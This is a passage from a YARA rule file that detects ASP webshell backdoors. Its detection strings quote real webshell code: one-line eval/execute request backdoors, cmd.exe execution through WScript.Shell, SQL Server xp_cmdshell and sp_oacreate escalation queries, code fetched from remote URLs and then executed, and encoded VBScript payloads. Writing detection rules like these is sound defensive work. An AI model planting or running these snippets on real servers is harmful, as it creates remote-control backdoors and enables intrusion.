        $s9 = "xD+D@*B*IJ@#@&]IUJdnDKksnW!Y`rE[W1Es+UY C^V oKsNkEU kE4hrD`birEBcTZ!*iJ@#@&\"]?r@!&/1Dr2D@*J@#@&mm/+,f@#@&k+DP^'jnM\\nDc/D" fullword ascii
        $s10 = "PxPrOj3:frt)qgJPL~-4;Dd0~[~E fG:mrx{oGs9/EUkZRTRZ ZuE,[,0YawK.Y,[~J-Oqk8u!r~[,\\4;.J0,[,JRKt6AxC4^n'ZJ~',\\4/.d0~[,E,Kt}|" fullword ascii
        $s11 = "zMz6rP9xn&Cz-Mw0Wwe'x*-M'+9WHTE(nf&-M-vxGrk/+kl#4YlhOT!\"`,NU+jss(&eJU+4Y~wC-3GwC-~@*@!~*-M'+9WHTE(nf&-M-vxGrk/+k~0bzeJwM-@*D" fullword ascii
        $s12 = "6D/tmD/W9+bb,@#@&bqP{Pk8~QP8P@#@&3x[~&0~@#@&H+XY~@#@&4XOnk $?:],'~kYMI+DEMUP@#@&~P,P3.MRZ^nlM@#@&AU[PwE" fullword ascii
        $s13 = "*R{|];W2wv]!G+0c|];*8v0muE*WTf|]EF1o!u y]+ Y+;sHlsn]y,Yf~YW2 4k[+6GM: w1m:+c\\msE" fullword ascii
        $s14 = ".KlDtr#xI]nhlOtvoW^Nn.hlY4b=2UN,(6)(6PU+/kkKU`rsGV9+.KmYtrb'rJP:4nx=sKV[+.KmY4'\"GWDnCO4)?ndkkGxvEwWs9+MnlDtrb'wWsN" fullword ascii
        $s15 = "FName=Request(\"FName\")#@~^F24BAA==@#@&@#@&~l13jMV{E@!(D@*@!(D@*@!1+xDnD@*@!l,4.+6'ELC\\Cd1DrwDltb/OGMXR8C13c#E@*" fullword ascii
        $s16 = "v@*fnV@!&l@*J@#@&Uq'j(LJ~@!m~4Dn6'ELl7lk^DbwO)wEsswWDscJrJ[\"nKlDtvnCY4'r-E[w 1m:nbLJJESrJ\\W7nwWs9+MJJ*BKUm^k^3{B.nDED" fullword ascii
        $s17 = "'ZJPLP78mMVWPLPER\"lYbGja'Fr~'P741Ds0~',{@#@&rRImYrGGWhUx8J~[,-(m.^0,[PrO\"CYbWdZM+[rD'!r~[,\\41.s0,[,JRp;GDl/EM.+" fullword ascii
        $s18 = "hPz.DmX`8+biUYM$TT~x,JEnMG\\bNn.{Hk^.K/G0D x+Ocrd2f~RW !pfCYmPjG!Dm" fullword ascii
        $s19 = "nfbDRgCh+@#@&,P~P(W,/ODw[1m:n@!@*JZGU6kLRtdbJ~ApjP/DDw[1m:n@!@*J]3;5Zd3frP25#~/DDwNHlhn@!@*EIA/5;S3]rP2}#,/ODw[glh" fullword ascii
        $s20 = "br@#@&j({?([r@!JY[@*@!JYD@*J@#@&?&!xJ@!Y.@*@!YN,4+botDxEJy!rJ~4L^KVGD{EJ[soowssEE,mGVk2mxxrJyJJ@*P@!&Y9@*@!zDD@*E,@#@&" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_417d4a44b9d4d23785b44461006f5d4eedb1b902
{
     meta:
        description = "asp - file 417d4a44b9d4d23785b44461006f5d4eedb1b902.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "40f6683142ddf214dbc8bc00a7b6463459a92bf0422ed563e8c5c32180329c0c"
     strings:
        $s1 = "<%e+x-v+x-a+x-l(+x-r+x-e+x-q+x-u+x-e+x-s+x-t+x-(+x-+ACI-c+ACI)+x-)+x-%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_86086dbbfa5126a86130d0483efe07d58b64d3d2
{
     meta:
        description = "asp - file 86086dbbfa5126a86130d0483efe07d58b64d3d2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "baf4c45b84a1cca5fd1b32df4d4d60d7cb41135c61156772bd9eec6f7660af6e"
     strings:
        $x1 = "Call  oScript.Run  (\"cmd.exe  /c  \"  &  szCMD  &  \"  >  \"  &  szTempFile,  0,  True)" fullword ascii
        $x2 = "bFieldContent  =  MidB(Binary,  (PosEndOfHeader  +  4),  PosCloseBoundary  -  (PosEndOfHeader  +  4)  -  2)" fullword ascii
        $s3 = "GetHeadFields  BinaryToString(HeaderContent),  Content_Disposition,  FormFieldName,  SourceFileName,  Content_Type" fullword ascii
        $s4 = "Content_Disposition  =  LTrim(SeparateField(Head,  \"content-disposition:\",  \";\"))" fullword ascii
        $s5 = "<p><input  type=\"text\"  name=\".CMD\"  size=\"45\"  value=\"<%=  szCMD  %>\">  <input  type=\"submit\"  value=\"Run\">  </p>" fullword ascii
        $s6 = "<b>User</b>:  <%=  \"\\\\\"  &  oScriptNet.ComputerName  &  \"  \\  \"  &  oScriptNet.UserName  %>  <br>" fullword ascii
        $s7 = "Content_Type  =  LTrim(SeparateField(Head,  \"content-type:\",  \";\"))" fullword ascii
        $s8 = "szTempFile  =  \"C:\\\"  &  oFileSys.GetTempName(  )" fullword ascii
        $s9 = "Function  GetHeadFields(ByVal  Head,  Content_Disposition,  Name,  FileName,  Content_Type)" fullword ascii
        $s10 = "response.write(\"File:  \"  &  FilePath  &  \"  Format:  \"  &  tempmsg  &  \"  has  been  saved.\")" fullword ascii
        $s11 = "response.write(\"<form  name=frmFileAttributes  action=ntdaddy.asp  method=post>\")" fullword ascii
        $s12 = "response.write(\"<form  name=frmFolderAttributes  action=ntdaddy.asp  method=post>\")" fullword ascii
        $s13 = "PosEndOfHeader  =  InStrB(PosOpenBoundary  +  Len(Boundary),  Binary,  StringToBinary(vbCrLf  +  vbCrLf))" fullword ascii
        $s14 = "HeaderContent  =  MidB(Binary,  PosOpenBoundary  +  LenB(Boundary)  +  2,  PosEndOfHeader  -  PosOpenBoundary  -  LenB(Boundary)" ascii
        $s15 = "HeaderContent  =  MidB(Binary,  PosOpenBoundary  +  LenB(Boundary)  +  2,  PosEndOfHeader  -  PosOpenBoundary  -  LenB(Boundary)" ascii
        $s16 = "response.write(\"<form  name=lstFiles  action=ntdaddy.asp  method=post>\")" fullword ascii
        $s17 = "response.write(\"<form  name=lstDrives  action=ntdaddy.asp  method=post>\")" fullword ascii
        $s18 = "response.write(\"<form  name=lstFolders  action=ntdaddy.asp  method=post>\")" fullword ascii
        $s19 = "<b>User  Agent</b>:  <%=request.servervariables(\"HTTP_USER_AGENT\")%>  <br>" fullword ascii
        $s20 = "response.write(\"<form  name=frmTextFile  action=ntdaddy.asp  method=post>\")" fullword ascii
     condition:
        ( uint16(0) == 0x213c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_0d6e79458473ca80ccffede5496edebc0b60a7ad
{
     meta:
        description = "asp - file 0d6e79458473ca80ccffede5496edebc0b60a7ad.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
     strings:
        $x1 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /" fullword ascii
        $x2 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
        $x3 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
        $x4 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
        $x5 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
        $x6 = "STRQUERY=\"DBCC ADDEXTENDEDPROC ('XP_CMDSHELL','XPLOG70.DLL')\"" fullword ascii
        $s7 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /C " ascii
        $s8 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s9 = "CMD=CHR(34)&\"CMD.EXE /C \"&REQUEST.FORM(\"CMD\")&\" > 8617.TMP\"&CHR(34)" fullword ascii
        $s10 = "STRQUERY = \"DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MICROSOFT\\JET\\4.0\\ENGINES','SANDBOXMOD" ascii
        $s11 = "Report = Report&\"<tr><td height=30>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s12 = "erongI.xEger~ ttap=nrettaP.xEger~ pxEgeR weN=xEger teS\":ExeCuTe(UZSS(ShiSan)):End Function " fullword ascii
        $s13 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s14 = "STRQUERY = \"DROP TABLE [JNC];DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /" fullword ascii
        $s15 = "STRQUERY = \"EXEC MASTER.DBO.XP_SERVICECONTROL 'START','SQLSERVERAGENT';\"" fullword ascii
        $s16 = "Call ws.Run (ShellPath&\" /c \" & DefCmd & \" > \" & szTempFile, 0, True)" fullword ascii
        $s17 = "ODE','REG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.E" ascii
        $s18 = "\"-HomeDir=c:\\\" & vbCrLf & \"-LoginMesFile=\" & vbCrLf & \"-Disable=0\" & vbCrLf & \"-RelPaths=1\" & vbCrLf & _" fullword ascii
        $s19 = "Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLED" ascii
        $s20 = "Conn.Execute(SqlStr)" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_5d3e86a91966fae81314a204fbb686ed7a6f6e7e
{
     meta:
        description = "asp - file 5d3e86a91966fae81314a204fbb686ed7a6f6e7e.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2c2037770be19ba4c839aa72952ae4bc28e6970c0f0b43b89865006c9ed2f936"
     strings:
        $s1 = "<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bordercolor=\"#FFFFFF\">" fullword ascii
        $s2 = "<body bgcolor=\"#000000\" leftmargin=\"0\" topmargin=\"0\" marginwidth=\"0\" marginheight=\"0\">" fullword ascii
        $s3 = "D /M+lDnr(L+1OcJUmMk2YrUTRok^n?H/Onsr4%n1YE#,ThYAAA==^#~@%>" fullword ascii
        $s4 = "<td><table width=\"700\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"1\">" fullword ascii
        $s5 = "PE@!D+aOmD+m~xm:+{^z09NmYCP^G^/x%Z~DKhdx8!PAr9Y4'2+@*@!&D+XYlM+m@*J,ShsAAA==^#~@%>" fullword ascii
        $s6 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
        $s7 = "Dc:lawmOtvIn;!+dOc?+M-+M.lMrC4^+k`E?/]&nP{g)HAJbb,MhMAAA==^#~@%>" fullword ascii
        $s8 = "<%#@~^HQAAAA==~6NCDl,'PM+$;+kYcJ1XW[9lYmE#,mwkAAA==^#~@%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( all of them ) ) or ( all of them )
}

rule d7db1e48c80329c53c4a71d591f58dc6c77e3449
{
     meta:
        description = "asp - file d7db1e48c80329c53c4a71d591f58dc6c77e3449.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3a5084256e61d9e31742b65db8800c704767b8e6bbec8a0e444eff158bceda84"
     strings:
        $s1 = "<%execute(unescape(\"eval%20request%28%222016%22%29\"))%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_912aed20b130926a637c15d5cfeb8f7d48ca2677
{
     meta:
        description = "asp - file 912aed20b130926a637c15d5cfeb8f7d48ca2677.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0bca26b98b3bf179a14c1c2e77c15fce6d177862fe5fba5e85a327b253b55898"
     strings:
        $s1 = "[O1WsWM):Tl!*ZXi1WVK.laA2~c+ NE@#@&]IUEA}fe~Pi?/]}SJAz] C(VCdqM_K /rdr]),aoowsswI?;IrdJ$b\"OUC)f6" fullword ascii
        $s2 = "[RmKVKDla33~c+ p8WMNn.=Fwa~kWsk9l[!XZ*Z*8r@#@&.DkJ ZP4C^0oDK;x9OmKsGD=aZ*T*TXp4GD9nD=!2a)J@#@&]M/ER1h9" fullword ascii
        $s3 = "D+P{POrt2I@#@&Y_2Kb\\3'1?:IcqHPv`cK&\\+M RPbH2]q*eq!ZTZPb3!c*#JFZb@#@&I]/,J@!8M@*@!6GxDP/Dzs+{B6WUYRdbyn)8+wXB@*" fullword ascii
        $s4 = "v@*;WwH@!&l@*J@#@&~P~~kqx?b'J,P@!C,tDnW{B%l7Ckm.bwD)s!V^oWM:cJrJ'.AnVz/+vwb:4'J'JL0 x)\\A~E-rSJ'-EbLJJESrJ9+^oKV[" fullword ascii
        $s5 = "D@*v*iJ@#@&\"IjJknDKrs+KEYvB9Gm!:nxDRCs^RH|jm4E:m^4+MRkE8:rOv#IBB*!Z!bIr@#@&]]UJ@!zk^Mk2D@*r@#@&1lknPy@#@&/" fullword ascii
        $s6 = "#~_,qBPsAxvHb:Z_ .zSi+*PR~&x?:.`sbY1u .zS`+SPEErJbP ~F*~E&r~JwE*@#@&di7bs~gr:Pm42;V+XYcsUrqjco2Dn6D+1Ur61" fullword ascii
        $s7 = "*[m4.`O,#L^4DvF8Fb[^4M`q!Ob[1t.cWG#'^4DcF8X*[^4DvF Z#L^tM`*G*[^4M`F8X#LmtMc*v*[1t.`1{*[^tMcF8*b'1tDcq8 b[14M`" fullword ascii
        $s8 = "\"kkPB9.Ghk/mwv'n2HY~BkdlaBxnslx~O!wUk@!@*DxG6z@!@*BD/K2B{NGtD+h~EJJLsD`[JrvxxKkDmCPh.K0@!@*M4@!@*l&@!rJ[nhm1sV" fullword ascii
        $s9 = "@!zl@*@!JON@*@!&YM@*E~,PP,~P,@#@&\"]dJ@!YM@*@!Y[@*@!mnxDnD@*@!4.,tkL4D'qPSr9Y4{B8!!uB@*EP,P~P,P~@#@&IIUE@!DD@*@!O[PmVboU'^n" fullword ascii
        $s10 = "4(^2Pv[/DlD:~QP8!*P@!P[3gf@#@&,~P,P~[b219~{PrxkOMAcG?DbD:~D[bB\\$Z\"VW~LP\\~^D^s#3f@#@&,P,P~PP+cYenA~',F~l,K  \\}f3P{f,)~D cWw" fullword ascii
        $s11 = "GY,Ij Ars@#@&,P~P&o,IdvJ:bAd2|P5h2E#{JP)~S2r~Y_21@#@&7P,Ygb\\+x.U`EKz$SA{H)t2Jb@#@&P~P,~,?({/&[J@!Y9~l^kLx{mnUD+D@*@!l,tD" fullword ascii
        $s12 = "19~bs@#@&~,P~P,n^/n@#@&,PP,P,~P:  YHn3~{FP=~KyRH}[3P{&,)~Y+ }wnx@#@&P,P~~,PPPqcnG/bObrU,',fk" fullword ascii
        $s13 = "PY_nU@#@&did7?COM230K]HGA~rD2: KmYu~,.k~~UYM+ls@#@&7diPnVU+@#@&iddirs,k1UP.`U5ksrV3J&/P~,E^rP'~&Y2h " fullword ascii
        $s14 = "6M2^m/AP',Y\"i+@#@&.+V+a TSW(CS,'P:];+@#@&\"2L2a hbOKA.x,'~E'4S)HVj)MAwkex'/C$JrTQw/C`-4km.raYuNdmMkwDk%l7lkm.k2O*Rnx1GN" fullword ascii
        $s15 = "?:]`tlPm4R-CdE+B~J@*J#*@#@&didUI/?nnnPxPbU?DDcqBPKh2^lV+yS,JdMmr~P8#@#@&did(0,?./U++0~@*,!PDu3x@#@&id7dd.1/320+P{P(HUKDcj\"mj2" fullword ascii
        $s16 = "xOOPza+lPrSF*_q*@#@&P~~,P~P,oAx9,',k1UYMcsUK)D:~O(g~.(/I*@#@&,~~P,P,PO0s wkJ+kPlMY~x9k+U9@#@&~P,~,P~,KwVRwq^3?&y3P{P[j:bDD~OGk+" fullword ascii
        $s17 = "P9l:+;D3lOnvYu+h)Y_#'E@!zY[@*@!Y[@*r'DCn9l:2[r@!JON@*@!&YM@*E@#@&ddi7d\"+nK]OP{PM2KW]PLJ@!YM@*@!DN@*ELY2\\KLJ@!zD[@*@!O9@*r[M" fullword ascii
        $s18 = "'8JPLP78ZMSWPLPER\"lYbG/;D+9rO'ZJ,[~\\8/MSWPL~J p;GDlZ;.M+UY{TrP',\\(ZDd0,'PrO}EKYC\\m6ks;:{!J,'~\\(ZMSWP'~|@#@&P,~P,P~~rOHCr" fullword ascii
        $s19 = "DPU+M-+MR\\lawCO4`J'r:mo+kwE#@#@&Dl.onOalOt{cJ'- wr[?n.7+.RtCawCDtvJ-b:mL+k-swDF CkwJ*b@#@&0/K ^WaX6ks+~WbVnwmOtBYC.T+Y2CDtSYM;" fullword ascii
        $s20 = "B~J{Jb@#@&d77i0WM~q,'P8~Or,*Z@#@&d77idO:h~',:r[vK:KJm3n B~UI/U+A| ,_,(~,Fb@#@&d77idq6~YtnP@!@*~J,J,lHf~Psw~@!@*~m_Ic1*PbH[,Khw," fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule sig_3a4aee002630ab97ca5f797951db25147809d5aa
{
     meta:
        description = "asp - file 3a4aee002630ab97ca5f797951db25147809d5aa.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0dcbd6cce79f768d9e9b79bc8c86be279779120b8232e32c1f3198ee56653518"
     strings:
        $s1 = "nda </a> - <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?kullanim');\">Kullan" fullword ascii
        $s2 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword ascii
        $s3 = "/wGUk+ hMrD+~rJLYEk[rE@#@&+UN,/;8@#@&B RO OO RRO O ORORR OR@#@&dE(P^Ck+%@#@&M+dwKUk+ SDbY+,J@!8D@*@!8D@*@!^n" fullword ascii
        $s4 = "document.write('<span id=\"typinglight\">'+message.charAt(m)+'</span>')" fullword ascii
        $s5 = "'+@*@!Vk@*ASh /m8KYCT+ Y+m:cGDTPSPShA kl\\kC3cmWs~SPShSRhkUr" fullword ascii
        $s6 = "document.write('<font face=\"'+fontface+'\" size=\"'+fontsize+'\" color=\"'+typingbasecolor+'\">')" fullword ascii
        $s7 = "y,)~hmkV8Gs4@$tKOslr^R1W:,~,4W^X[+sWU@$4WYsCk^RmKh~~,hSh /CUmVO+MGDcW.L,/kOnsk\"N" fullword ascii
        $s8 = "var tempref=document.all.typinglight" fullword ascii
        $s9 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
        $s10 = "21212; border-right:1px solid #5d5d5d; border-bottom:1px solid #5d5d5d; border-top:1px solid #121212;}</style>" fullword ascii
        $s11 = "nDexEr - Reader\"" fullword ascii
        $s12 = "<td><font color=pink>Oku :</font><td><input type=\"text\" name=\"klasor\" size=25 value=<%=#@~^LQAAAA==." fullword ascii
        $s13 = "OpenWin = this.open(page, \"CtrlWindow\",\"toolbar=menubar=No,scrollbars=No,status=No,height=250,\");" fullword ascii
        $s14 = "hP~k^orVn.b@!8D@*@!0KxO~1WVG.{h4kDn,/r.+{ @*@!z1nxD+.@*@!0GUDP/b\"+{F@*@!sr@*g+MNnx_~~E.lHCPzYC^m" fullword ascii
        $s15 = "<a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?hakkinda');\">" fullword ascii
        $s16 = "x@#@&mmV^~mm/nF@#@&nsk+k6~WT+P{~EW0ErPOtnU@#@&^l^sP1ldny@#@&nsk+r0,GT+~{Prtl03bUNmJ~Y4+U@#@&ml^sP1l/" fullword ascii
        $s17 = "var message=\"SaNaLTeRoR - " fullword ascii
        $s18 = "m Bilgileri </a>- <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?copy');\">Copright</a> -<a href=\"javascript:voi" ascii
        $s19 = "m Bilgileri </a>- <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?copy');\">Copright</a> -<a href=\"javascript:voi" ascii
        $s20 = "/n SDkOn,J@!4M@*@!0GM:,lmDkKU'QPh+DtG[{wWkO@*@!kxa;OPDXa+x/;8skOP7CV!+xErb1)~UbeszErPdby" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule e92a789b1f606f87aaa437a2e8f774b47741f865
{
     meta:
        description = "asp - file e92a789b1f606f87aaa437a2e8f774b47741f865.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8054e1a3a6245488b57c2a7ea235ebe2b81a3e73d96e10c1c732223754e5788d"
     strings:
        $s1 = "Http.setRequestHeader \"CONTENT-TYPE\", \"application/x-www-form-urlencoded\" " fullword ascii
        $s2 = "SItEuRl=http://asp-muma.com/\" '" fullword ascii
        $s3 = "bg =\"http://www.7jyewu.cn/webshell/asp.jpg\" " fullword ascii
        $s4 = "PostHTTPPage=bytesToBSTR(Http.responseBody,\"gbk\") " fullword ascii
        $s5 = "function PostHTTPPage(url) " fullword ascii
        $s6 = "execute aspCode" fullword ascii
        $s7 = "set Http=server.createobject(\"MSXML2.SERVERXMLHTTP.3.0\")" fullword ascii
        $s8 = "if Http.readystate<>4 then " fullword ascii
        $s9 = "aspCode=PostHTTPPage(Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Chr ( 119 ) " ascii
        $s10 = "aspCode=PostHTTPPage(Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Chr ( 119 ) " ascii
        $s11 = "BytesToBstr = objstream.ReadText " fullword ascii
        $s12 = "Http.send " fullword ascii
        $s13 = "aspCode=CStr(Session(\"aspCode\"))" fullword ascii
        $s14 = "if aspCode=\"\" or aspCode=null or isnull(aspCode) then " fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule sig_70656f3495e2b3ad391a77d5208eec0fb9e2d931
{
     meta:
        description = "asp - file 70656f3495e2b3ad391a77d5208eec0fb9e2d931.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9f7c28ec95d312985066c92cdae09c7854d99680f3248b7c639561a19c1c3566"
     strings:
        $s1 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail.com title=\"E-mail G" fullword ascii
        $s2 = "r: #003333; scrollbar-darkshadow-color: #000000; scrollbar-track-color: #993300; scrollbar-arrow-color: #CC3300;}" fullword ascii
        $s3 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: 4px; LETTER-SPACING: 1px; HEIGHT: 27px" fullword ascii
        $s4 = "ls+UQMAAA==^#~@%> - www.infilak.tr.cx</title><%#@~^HAEAAA==@#@&l^DP{PI" fullword ascii
        $s5 = "D /M+lDnr(L+1OcJtk1DG/GWDRpHduK:nEb@#@&W8%_KPnc6a+U,JV2Kr~,EJL3slkW.'rJ~,Wl^/+@#@&G4NC:KKRjn" fullword ascii
        $s6 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
        $s7 = "nder\"><font face=wingdings color=lime size=4>*</font> </a>&nbsp; <a href=http://www.infilaktim.tk title=\"I.N.F Sitesi\" target" ascii
        $s8 = "dDRWKDs`Jb/^n:r#@#@&b0~rkV+sxJrPY4nU@#@&kkVn:~x,J[EME@#@&+U[,k0@#@&b0~3^CkW.,',JJ,Y4nx,3slkW.x,D+$;+kYRkn.\\" fullword ascii
        $s9 = "nder\"><font face=wingdings color=lime size=4>*</font> </a>&nbsp; <a href=http://www.infilaktim.tk title=\"I.N.F Sitesi\" target" ascii
        $s10 = "@!zm@*Pr9LwCAA==^#~@%><title>I.N.F HACKING CENTER - <%=#@~^CAAAAA==2MWm" fullword ascii
        $s11 = "=klasor size=49 value=\"<%=#@~^BgAAAA==V^ldKDjAIAAA==^#~@%>\"> &nbsp; <input type=submit value=\"Kodlar" fullword ascii
        $s12 = "%\" border=0 bgcolor=\"#666666\" cellpadding=1 cellspacing=1><tr><td><center> <%#@~^WQAAAA==@#@&DnkwKx/" fullword ascii
        $s13 = "lank><font face=wingdings color=lime size=4>M</font> </a>&nbsp; <a href=\"?action=help\" title=\"Yard" fullword ascii
        $s14 = "8dwp@!(D@*@!8.@*@!CP4.+6'hCbVYGlslrV(Gs4@$4WD:lbVc^Ws@*\\+4Nr@!Jl@*LU4kwiLU8/aiLx8/2ILx8/aI[" fullword ascii
        $s15 = "P+XY#@#@&.+kwKxd+ AMkO+,VW9VC.@#@&+U[,kWoT4AAA==^#~@%>" fullword ascii
        $s16 = "D7l.kC8^+d`r)nhSmK_5?(/zSmnzP_Jb@#@&gVMAAA==^#~@%><center> <%#@~^UAAAAA==@#@&DnkwKx/" fullword ascii
        $s17 = "FONT-SIZE: 11px; BACKGROUND: none transparent scroll repeat 0% 0%; COLOR: #006699; FONT-FAMILY: Verdana, Helvetica" fullword ascii
        $s18 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 toolbar=no scrollbars=yes' )\"><font face=wingdi" ascii
        $s19 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 toolbar=no scrollbars=yes' )\"><font face=wingdi" ascii
        $s20 = "<tr><td bgcolor=\"#CCCCCC\" height=359><%#@~^QwAAAA==r6PUKY,k/^+s~',J8lkVCE,Yt" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule sig_441e276071d4143089d416d1570e8a1970a80033
{
     meta:
        description = "asp - file 441e276071d4143089d416d1570e8a1970a80033.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "144a1fc3d3756c6bd8c92f8ec408a61332cb830fa1779e8c41ed5851ebbc6974"
     strings:
        $s1 = "<FORM method=post target=_blank>ShellUrl: <INPUT " fullword ascii
        $s2 = "size=58 value=http://www.heimian.com/s.asp name=act> Path: <INPUT " fullword ascii
        $s3 = "<td height=\"22\" class=\"td\" align=\"center\" > <span class=\"STYLE5\">Asp shell up Client </span> </td>" fullword ascii
        $s4 = "style=\"BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid\" " fullword ascii
        $s5 = "<title>Asp shell up Client</title>" fullword ascii
        $s6 = "<table width=\"780\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">" fullword ascii
        $s7 = "webshell" fullword ascii
        $s8 = "size=8 value=\"4.txt\" name=path> <INPUT onClick=\"Javascipt:name=path.value;action=document.all.act.value;submit();\" type=butt" ascii
        $s9 = "response.redirect request(\"path\")" fullword ascii
        $s10 = "size=8 value=\"4.txt\" name=path> <INPUT onClick=\"Javascipt:name=path.value;action=document.all.act.value;submit();\" type=butt" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 7KB and ( all of them ) ) or ( all of them )
}

rule sig_52ce724580e533da983856c4ebe634336f5fd13a
{
     meta:
        description = "asp - file 52ce724580e533da983856c4ebe634336f5fd13a.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "36ce6845acc789946a06ed72736d1a7d5ddc7dccf017f1e92a4c415545315ddf"
     strings:
        $s1 = "<%execute(request(" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule b184dc97b19485f734e3057e67007a16d47b2a62
{
     meta:
        description = "asp - file b184dc97b19485f734e3057e67007a16d47b2a62.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "068ff8575fbe2ecc5381c8951d3bd271f9845840e779f6271c7fa2da9dae2c96"
     strings:
        $s1 = "<%@LANGUAGE=\"JAVASCRIPT\" CODEPAGE=\"65001\"%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_037752fdd098a42e25c4b2c9960d18dd214aa3f6
{
     meta:
        description = "asp - file 037752fdd098a42e25c4b2c9960d18dd214aa3f6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7d046439732109dd70ca88b040223f9eebd55bc523d62ac85381a95176714a14"
     strings:
        $x1 = "m'>KingDefacer</a> - <a href='HTTP://WWW.alturks.com' target='_blank'>HTTP://WWW.alturks.com</a> ::.</font>\"" fullword ascii
